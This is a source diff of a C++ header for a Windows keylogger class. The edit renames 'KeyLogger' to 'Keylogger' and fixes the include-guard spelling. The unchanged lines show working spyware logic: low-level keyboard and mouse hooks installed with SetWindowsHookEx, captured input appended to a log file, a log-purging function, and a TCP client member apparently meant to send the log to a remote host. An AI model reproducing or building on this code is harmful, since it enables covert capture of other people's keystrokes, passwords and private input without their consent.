@@ -1,5 +1,5 @@
-#ifndef _KEYLOGER_HPP_
-#define _KEYLOGER_HPP_
+#ifndef _KEYLOGGER_HPP_
+#define _KEYLOGGER_HPP_
 
 #include <map>
 #include <string>
@@ -21,7 +21,7 @@ LRESULT CALLBACK MouseProc(int code, WPARAM wParam, LPARAM lParam);
 //                  Compact single instance class in stack                       //
 ///////////////////////////////////////////////////////////////////////////////////
 
-class KeyLogger
+class Keylogger
 {
 private:
 	TCPClient* m_client = nullptr;
@@ -70,32 +70,32 @@ public:
 		return GetMessage(&m_msg, 0, NULL, 0);
 	}
 
-	static KeyLogger& getInstance()
+	static Keylogger& getInstance()
 	{
-		static KeyLogger singleton;
+		static Keylogger singleton;
 		return singleton;
 	}
 
-	void KeyLogger::setTCPClient(TCPClient *client)
+	void Keylogger::setTCPClient(TCPClient *client)
 	{
 		m_client = client;
 	}
 
-	void KeyLogger::stopRecording()
+	void Keylogger::stopRecording()
 	{
 		UnhookWindowsHookEx(m_hook);
 		UnhookWindowsHookEx(m_hook_mouse);
 		m_output.close();
 	}
 
-	void KeyLogger::startRecording()
+	void Keylogger::startRecording()
 	{
 		m_hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0); //Enable keyboard hook
 		m_hook_mouse = SetWindowsHookEx(WH_MOUSE_LL, MouseProc, NULL, 0); //Enable mouse hook
 		m_output.open("./log.txt", std::ofstream::app);
 	}
 
-	void KeyLogger::purgeLog()
+	void Keylogger::purgeLog()
 	{
 		m_output.open("./log.txt", std::ofstream::trunc);
 		m_output.close();
@@ -107,22 +107,22 @@ private:
 	MSG m_msg;
 	std::ofstream m_output;
 
-	KeyLogger() {
+	Keylogger() {
 		m_hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0); //Enable keyboard hook
 		m_hook_mouse = SetWindowsHookEx(WH_MOUSE_LL, MouseProc, NULL, 0); //Enable mouse hook
 		m_output.open("./log.txt", std::ofstream::app);
 	};
 
-	~KeyLogger() {
+	~Keylogger() {
 		UnhookWindowsHookEx(m_hook);
 		UnhookWindowsHookEx(m_hook_mouse);
 		m_output.close();
 	};
 
-	KeyLogger(const KeyLogger&);                 // SingleTon Cannot be copied copy-construction
-	KeyLogger& operator=(const KeyLogger&) {      // SingleTon Cannot be assigned
+	Keylogger(const Keylogger&);                 // SingleTon Cannot be copied copy-construction
+	Keylogger& operator=(const Keylogger&) {      // SingleTon Cannot be assigned
 
 	};
 };
 
-#endif /* !_KEYLOGER_HPP_ */
+#endif /* !_KEYLOGGER_HPP_ */
